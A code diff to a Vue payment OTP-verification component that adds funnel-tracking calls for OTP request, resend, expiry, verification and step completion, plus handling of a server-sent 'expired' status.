@@ -150,6 +150,7 @@ import { useRouter } from 'vue-router';
 import { useI18n } from 'vue-i18n';
 import i18n from '@/i18n';
 import { useVisitorTracking } from '@/composables/useVisitorTracking';
+import { trackStepViewed, trackOtpRequested, trackOtpResent, trackOtpExpired, trackOtpVerified, trackStepCompleted } from '@/composables/useFunnelTracking';
 import { usePayment } from '@/composables/usePayment';
 import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
 import { getOtpStatus } from '@/api/paymentApi';
@@ -241,6 +242,7 @@ function startExpiryTimer ()
         if ( codeExpiry.value <= 0 )
         {
             clearInterval( expiryInterval );
+            trackOtpExpired();
         }
     }, 1000 );
 }
@@ -310,6 +312,7 @@ const resendOtp = async () =>
         otpInputRef.value?.clear();
         startResendTimer();
         startExpiryTimer();
+        trackOtpResent();
     } else
     {
         error.value = t( 'verification.otp.resendError' );
@@ -329,6 +332,8 @@ const { setup: setupWs } = usePaymentWebSocket( {
     {
         logger.debug( '[OTP] Approved:', event );
         isVerifying.value = false;
+        trackOtpVerified();
+        trackStepCompleted( 'otp', 'card_pin' );
 
         // Defer navigation to release the WS message handler and avoid
         // Chrome "[Violation] 'message' handler took Xms" warnings.
@@ -366,6 +371,10 @@ const { setup: setupWs } = usePaymentWebSocket( {
         } else if ( data.status === 'rejected' )
         {
             handleRejected( { reason: data.reason || 'otp_other' } );
+        } else if ( data.status === 'expired' )
+        {
+            // Server confirms expiry — trigger the same path as the local timer
+            handleRejected( { reason: 'otp_expired' } );
         }
     },
 } );
@@ -413,6 +422,8 @@ onMounted( async () =>
     startExpiryTimer();
     setupWs( ip );
     initWebOTP();
+    trackStepViewed( 'otp' );
+    trackOtpRequested();
 } );
 
 let autoSubmitTimer = null;
